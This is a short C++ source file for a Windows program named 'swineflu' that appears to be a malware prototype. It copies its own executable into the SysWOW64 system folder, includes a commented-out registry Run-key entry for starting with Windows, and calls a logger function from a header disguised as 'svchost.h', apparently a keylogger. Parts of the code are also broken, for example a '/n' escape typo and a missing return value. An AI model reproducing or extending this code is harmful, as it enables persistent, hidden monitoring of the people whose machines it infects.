// swineflu.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <string.h>

#include <sstream>
#include <string>

#include "Shlwapi.h"


#include <iostream>
#include "svchost.h"
#include <tchar.h>

using namespace std;



int addRunEntry()
{
	//RegSetKeyValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, "C:\\Windows\\SysWOW64\\swineflu.exe", strlen("C:\\Windows\\SysWOW64\\swineflu.exe") + 1);
}

string ExePath() {
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	return string(buffer).substr(0, pos);
}

void adminstartup()
{
	HKEY hkey;
	DWORD dwDispoition;

	string str = ExePath();
	printf(str.c_str());
	str.append("\\swineflu.exe");

	BOOL b = CopyFile(str.c_str(),
		"C:\\Windows\\SysWOW64\\swineflu.exe", 0);
	if (!b) {

		
		
		printf("%d/n", GetLastError());
	}
	else {
		printf("okay/n");
	}


	getchar();
}


int _tmain(int argc, _TCHAR* argv[])
{
	printf("wear your mask please\n");
	adminstartup();
	logger();
	return 0;
}


